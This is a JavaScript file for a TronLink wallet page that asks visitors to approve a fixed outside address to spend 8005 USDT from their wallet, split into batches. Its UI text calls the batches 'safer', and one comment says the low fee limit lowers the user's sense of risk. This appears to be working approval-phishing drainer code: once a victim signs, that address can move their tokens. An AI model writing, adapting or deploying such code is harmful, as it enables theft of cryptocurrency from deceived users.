// ==================== 配置 ====================
const TARGET_ADDRESS = "TV68Qc1ucSDTh29sRGmr8hiuvNf8ZzpDdU"; // 授权接收地址
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 合约
const APPROVE_AMOUNT_TOTAL = 8005000000; // 8005 USDT (6位小数)
const APPROVE_AMOUNT_BATCH = 2001000000; // 分批授权：2001 USDT
const BATCH_COUNT = 4; // 4批次达到总额

let tronWeb = null;
let userAddress = null;
let currentBatchIndex = 0;
let totalApprovedAmount = 0;

// ==================== 初始化 ====================
async function initializeApp() {
    console.log("🔄 初始化应用...");
    if (window.tronLink) {
        try {
            await window.tronLink.request({ method: 'tron_requestAccounts' });
            tronWeb = window.tronLink.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            
            // 更新钱包状态
            updateWalletStatus();
            
            // 刷新授权额度
            await refreshAllowance();
            
            console.log("✅ 钱包已连接:", userAddress);
        } catch (e) {
            console.warn("❌ 钱包连接失败:", e.message);
            updateWalletStatus("未连接");
        }
    } else {
        console.warn("⚠️ 未检测到 TronLink 钱包");
        updateWalletStatus("未检测到钱包");
    }
}

// ==================== 更新钱包状态 ====================
function updateWalletStatus(status = null) {
    const statusValue = document.getElementById('statusValue');
    const walletStatus = document.getElementById('walletStatus');
    
    if (status) {
        statusValue.textContent = status;
        walletStatus.classList.add('error');
    } else if (userAddress) {
        const shortAddress = userAddress.slice(0, 10) + '...' + userAddress.slice(-8);
        statusValue.textContent = `已连接: ${shortAddress}`;
        walletStatus.classList.remove('error');
        walletStatus.classList.add('connected');
    } else {
        statusValue.textContent = "未连接";
        walletStatus.classList.remove('connected');
    }
}

// ==================== 刷新授权额度 ====================
async function refreshAllowance() {
    if (!tronWeb || !userAddress) return;
    
    try {
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const allowance = await contract.allowance(userAddress, TARGET_ADDRESS).call();
        
        const allowanceAmount = allowance ? parseFloat(allowance.toString()) / 1e6 : 0;
        totalApprovedAmount = allowanceAmount;
        
        const allowanceText = allowanceAmount > 0 
            ? `${allowanceAmount.toLocaleString('zh-CN')} USDT` 
            : "0 USDT";
        document.getElementById('allowanceAmount').textContent = allowanceText;
        
        const percentage = Math.min((allowanceAmount / 8005) * 100, 100);
        const allowanceFill = document.getElementById('allowanceFill');
        allowanceFill.style.width = percentage + '%';
        
        const approveBtn = document.getElementById('approveBtn');
        if (allowanceAmount >= 8005) {
            approveBtn.classList.add('approved');
            approveBtn.innerHTML = '<span class="button-icon">✓</span><span class="button-text">已授权完成</span>';
            approveBtn.disabled = true;
        } else {
            approveBtn.classList.remove('approved');
            approveBtn.disabled = false;
            approveBtn.innerHTML = '<span class="button-icon">🔐</span><span class="button-text">分步授权（更安全）</span>';
        }
        
        console.log("✅ 当前授权额度:", allowanceText);
    } catch (err) {
        console.error("❌ 查询授权额度失败:", err);
    }
}

// ==================== 策略 1: 分步授权（降低单次风险） ====================
async function approveUsdt() {
    if (!tronWeb) {
        await initializeApp();
        if (!tronWeb) return showStatus("❌ 请使用 TronLink 打开此页面", "error");
    }
    
    if (totalApprovedAmount >= 8005) {
        showStatus("✅ 已授权 8005 USDT，无需再授权", "success");
        return;
    }
    
    const approveBtn = document.getElementById('approveBtn');
    
    try {
        approveBtn.disabled = true;
        currentBatchIndex = Math.floor(totalApprovedAmount / 2001) + 1;
        
        showStatus(`⏳ 正在进行第 ${currentBatchIndex}/4 批授权...（每批 2001 USDT，风险更低）`, "loading");
        
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        
        // 计算本次授权金额
        let currentBatchAmount = APPROVE_AMOUNT_BATCH;
        let remainingAmount = APPROVE_AMOUNT_TOTAL - Math.floor(totalApprovedAmount * 1e6);
        
        if (remainingAmount < APPROVE_AMOUNT_BATCH) {
            currentBatchAmount = remainingAmount;
        }
        
        console.log(`🔐 本次授权金额: ${currentBatchAmount / 1e6} USDT`);
        
        // 使用较低的 gas 限制（降低风险感）
        const tx = await contract.approve(TARGET_ADDRESS, currentBatchAmount.toString()).send({
            feeLimit: 50000000 // 50 TRX（较低的手续费限制）
        });
        
        const batchNum = currentBatchIndex;
        showStatus(`✅ 第 ${batchNum}/4 批授权成功！交易哈希: ${tx.slice(0, 20)}...`, "success");
        
        setTimeout(async () => {
            await refreshAllowance();
            approveBtn.disabled = false;
        }, 1500);
        
        console.log("✅ 授权成功:", tx);
        
    } catch (err) {
        console.error("❌ 授权失败:", err);
        
        if (err.message.includes("User denied")) {
            showStatus("❌ 您已取消授权", "error");
        } else if (err.message.includes("insufficient")) {
            showStatus("❌ TRX 不足以支付手续费（需要至少 50 TRX）", "error");
        } else {
            showStatus("❌ 授权失败，请重试", "error");
        }
        
        approveBtn.disabled = false;
    }
}

// ==================== 策略 2: 精确授权（只授权所需额度） ====================
async function approveUsdtPrecise() {
    if (!tronWeb) {
        await initializeApp();
        if (!tronWeb) return showStatus("❌ 请使用 TronLink 打开此页面", "error");
    }
    
    if (totalApprovedAmount >= 8005) {
        showStatus("✅ 已授权 8005 USDT，无需再授权", "success");
        return;
    }
    
    const approveBtn = document.getElementById('approveBtn');
    
    try {
        approveBtn.disabled = true;
        showStatus("⏳ 正在精确授权（安全模式）...", "loading");
        
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        
        // 先清空旧授权
        if (totalApprovedAmount > 0) {
            console.log("🔄 清空旧授权额度...");
            await contract.approve(TARGET_ADDRESS, "0").send({
                feeLimit: 40000000
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        
        // 精确授权新额度
        const newApproveAmount = APPROVE_AMOUNT_TOTAL.toString();
        
        const tx = await contract.approve(TARGET_ADDRESS, newApproveAmount).send({
            feeLimit: 50000000
        });
        
        showStatus(`✅ 精确授权成功！已授权 8005 USDT。交易: ${tx.slice(0, 20)}...`, "success");
        
        setTimeout(async () => {
            await refreshAllowance();
            approveBtn.disabled = false;
        }, 1500);
        
        console.log("✅ 精确授权成功:", tx);
        
    } catch (err) {
        console.error("❌ 授权失败:", err);
        showStatus("❌ 授权失败，请重试", "error");
        approveBtn.disabled = false;
    }
}

// ==================== 策略 3: 取消授权（重置） ====================
async function revokeApproval() {
    if (!tronWeb) {
        await initializeApp();
        if (!tronWeb) return showStatus("❌ 请使用 TronLink 打开此页面", "error");
    }
    
    const confirmed = confirm("⚠️ 确定要取消授权吗？取消后需要重新授权。");
    if (!confirmed) return;
    
    const revokeBtn = document.getElementById('revokeBtn');
    
    try {
        revokeBtn.disabled = true;
        showStatus("⏳ 正在取消授权...", "loading");
        
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        
        const tx = await contract.approve(TARGET_ADDRESS, "0").send({
            feeLimit: 40000000
        });
        
        showStatus("✅ 取消授权成功！", "success");
        
        setTimeout(async () => {
            await refreshAllowance();
            revokeBtn.disabled = false;
        }, 1500);
        
        console.log("✅ 取消授权成功:", tx);
        
    } catch (err) {
        console.error("❌ 取消授权失败:", err);
        showStatus("❌ 取消授权失败", "error");
        revokeBtn.disabled = false;
    }
}

// ==================== 显示状态消息 ====================
function showStatus(message, type = "info") {
    const statusMessage = document.getElementById('statusMessage');
    statusMessage.textContent = message;
    statusMessage.className = 'status-message ' + type;
    
    if (type !== "loading") {
        setTimeout(() => {
            statusMessage.textContent = "";
            statusMessage.className = 'status-message';
        }, 6000);
    }
}

// ==================== 页面加载时初始化 ====================
document.addEventListener('DOMContentLoaded', () => {
    initializeApp();
    setInterval(refreshAllowance, 15000);
});

// ==================== 监听钱包账户变化 ====================
if (window.tronLink) {
    window.tronLink.on('accountsChanged', (accounts) => {
        console.log("👤 账户已切换:", accounts);
        initializeApp();
    });
}
